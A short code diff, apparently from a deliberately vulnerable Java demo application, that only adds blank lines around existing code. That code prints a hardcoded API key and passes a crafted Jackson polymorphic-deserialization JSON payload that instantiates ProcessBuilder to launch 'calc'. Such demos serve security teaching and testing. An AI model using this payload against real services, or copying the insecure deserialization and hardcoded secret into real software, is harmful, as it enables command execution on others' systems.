@@ -10,6 +10,9 @@ public class DemoApplication {
         // Print the hardcoded secret
         service.printApiKey();
 
+
+
+
         // Jackson insecure deserialization demo payload (crafted malicious JSON)
         String maliciousJson = "{\"@class\":\"java.lang.AutoCloseable\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc\"]}";
         service.jacksonDeserialize(maliciousJson);
